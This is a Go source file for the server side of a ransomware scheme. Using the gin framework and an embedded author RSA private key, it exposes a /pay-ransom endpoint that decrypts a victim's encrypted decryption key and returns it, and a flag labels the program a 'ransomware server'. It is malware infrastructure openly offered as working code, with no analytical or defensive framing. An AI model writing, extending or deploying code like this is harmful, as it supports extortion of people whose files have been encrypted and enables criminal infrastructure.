package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"flag"
	"fmt"
	"log"
	"net/http"

	_ "embed"

	"github.com/gin-gonic/gin"
)

//go:embed keypair.pem
var AuthorPrivateKey []byte

func main() {
	port := flag.Uint("port", 8081, "port to run ransomware server on")
	flag.Parse()

	p, _ := pem.Decode(AuthorPrivateKey)
	SECRET_PRIVATE_KEY, err := x509.ParsePKCS8PrivateKey(p.Bytes)
	if err != nil {
		log.Fatal("bad key:", err)
	}

	// TODO: add ratelimiting
	r := gin.Default()

	r.POST("/pay-ransom", func(c *gin.Context) {
		encryptedDecryptionPrivateKey, exists := c.GetPostForm("key")
		if !exists {
			c.AbortWithStatus(http.StatusBadRequest)
			return
		}

		bs, err := rsa.DecryptPKCS1v15(rand.Reader, SECRET_PRIVATE_KEY.(*rsa.PrivateKey), []byte(encryptedDecryptionPrivateKey))
		if err != nil {
			c.AbortWithStatus(http.StatusBadRequest)
			return
		}

		c.String(http.StatusOK, "%s", string(bs))
	})

	r.Run(fmt.Sprintf(":%d", *port))
}
